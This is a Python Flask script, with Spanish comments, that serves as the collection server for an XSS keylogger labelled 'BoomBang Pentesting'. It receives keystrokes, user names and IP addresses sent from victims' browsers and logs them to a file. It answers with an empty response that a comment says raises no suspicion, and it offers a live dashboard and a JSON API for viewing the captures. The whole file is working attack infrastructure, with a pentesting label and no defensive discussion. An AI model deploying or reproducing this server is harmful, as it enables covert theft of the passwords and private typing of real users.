#!/usr/bin/env python3
"""
XSS Keylogger - Servidor de recolección de teclas capturadas
Uso: python3 keylogger.py
"""

from flask import Flask, request, jsonify
from datetime import datetime
import os
import sys

app = Flask(__name__)
LOG_FILE = 'logs/keylogger.log'

@app.route('/keys', methods=['GET', 'POST'])
def log_keys():
    """Endpoint para recibir teclas capturadas"""
    # Obtener datos
    data = request.args.get('data', request.form.get('data', ''))
    user = request.args.get('user', request.form.get('user', 'Unknown'))
    ip_address = request.remote_addr
    timestamp = datetime.now().isoformat()

    if not data:
        return '', 204  # No content

    # Guardar en archivo
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f'[{timestamp}] {ip_address} | {user} | {data}\n')

        # Log en consola con formato bonito
        print(f'\n{"="*60}')
        print(f'[+] TECLAS CAPTURADAS')
        print(f'{"="*60}')
        print(f'Usuario   : {user}')
        print(f'IP        : {ip_address}')
        print(f'Timestamp : {timestamp}')
        print(f'Datos     : {data}')
        print(f'{"="*60}\n')

    except Exception as e:
        print(f'[✗] Error al guardar log: {e}')
        return jsonify({'error': str(e)}), 500

    # Respuesta vacía (no levanta sospechas)
    return '', 200

@app.route('/view')
def view_logs():
    """Vista web de los logs capturados"""
    try:
        # Leer últimas 1000 líneas
        if not os.path.exists(LOG_FILE):
            lines = []
        else:
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                lines = f.readlines()[-1000:]

        html = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>⌨️ Keylogger Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #ff6600;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .header {
            background: linear-gradient(90deg, #1a1a1a, #2a2a2a);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 2px solid #ff6600;
        }
        .header h1 {
            font-size: 32px;
            text-shadow: 0 0 10px #ff6600;
        }
        .log-container {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 20px;
            max-height: 80vh;
            overflow-y: auto;
        }
        .log-entry {
            background: #0a0a0a;
            border-left: 3px solid #ff6600;
            padding: 10px;
            margin-bottom: 10px;
            font-size: 14px;
        }
        .timestamp { color: #888; }
        .ip { color: #00ffff; }
        .user { color: #00ff00; }
        .data { color: #ffff00; font-weight: bold; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-box {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #ff6600;
        }
        .stat-box h3 { color: #ff6600; margin-bottom: 5px; }
        .stat-box p { font-size: 24px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>⌨️ Keylogger Dashboard</h1>
        <p>BoomBang Server - Keystroke Monitor</p>
    </div>

    <div class="stats">
        <div class="stat-box">
            <h3>Total Capturas</h3>
            <p>''' + str(len(lines)) + '''</p>
        </div>
        <div class="stat-box">
            <h3>Estado</h3>
            <p>🟢 Activo</p>
        </div>
    </div>

    <div class="log-container">
        <h2>📝 Últimas 1000 Capturas</h2>
        <hr style="margin: 15px 0; border-color: #333;">
'''

        if not lines:
            html += '<p style="text-align: center; padding: 50px; color: #666;">No hay capturas todavía...</p>'
        else:
            for line in reversed(lines):  # Más recientes primero
                parts = line.strip().split(' | ')
                if len(parts) >= 3:
                    timestamp_part = parts[0]
                    ip_part = parts[1]
                    user_part = parts[2] if len(parts) > 3 else 'Unknown'
                    data_part = parts[3] if len(parts) > 3 else parts[2]

                    html += f'''
        <div class="log-entry">
            <span class="timestamp">{timestamp_part}</span> |
            <span class="ip">{ip_part}</span> |
            <span class="user">{user_part}</span><br>
            <span class="data">Datos: {data_part}</span>
        </div>
'''

        html += '''
    </div>

    <script>
        // Auto-refresh cada 3 segundos
        setTimeout(() => {
            location.reload();
        }, 3000);
    </script>
</body>
</html>
'''
        return html

    except Exception as e:
        return f'<h1>Error</h1><pre>{str(e)}</pre>', 500

@app.route('/api/keys', methods=['GET'])
def api_keys():
    """API JSON para obtener capturas"""
    try:
        limit = int(request.args.get('limit', 100))

        if not os.path.exists(LOG_FILE):
            return jsonify({'total': 0, 'captures': []})

        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()[-limit:]

        captures = []
        for line in lines:
            parts = line.strip().split(' | ')
            if len(parts) >= 3:
                captures.append({
                    'timestamp': parts[0],
                    'ip': parts[1],
                    'user': parts[2] if len(parts) > 3 else 'Unknown',
                    'data': parts[3] if len(parts) > 3 else parts[2]
                })

        return jsonify({'total': len(captures), 'captures': captures})

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/health')
def health():
    """Health check"""
    return jsonify({
        'status': 'ok',
        'service': 'XSS Keylogger',
        'timestamp': datetime.now().isoformat()
    })

if __name__ == '__main__':
    # Banner
    print('\n' + '='*60)
    print('⌨️  XSS KEYLOGGER - BoomBang Pentesting')
    print('='*60)

    # Crear directorio de logs
    os.makedirs('logs', exist_ok=True)

    # Información
    print(f'\n[*] Servidor iniciando...')
    print(f'[*] Dashboard disponible en: http://0.0.0.0:6000/view')
    print(f'[*] API endpoint: http://0.0.0.0:6000/api/keys')
    print(f'[*] Archivo de log: {LOG_FILE}')
    print(f'\n[!] Puerto 6000 debe estar abierto en el firewall')
    print('='*60 + '\n')

    # Iniciar servidor
    try:
        app.run(host='0.0.0.0', port=6000, debug=False)
    except KeyboardInterrupt:
        print('\n\n[*] Servidor detenido por el usuario')
        sys.exit(0)
    except Exception as e:
        print(f'\n[✗] Error al iniciar servidor: {e}')
        sys.exit(1)
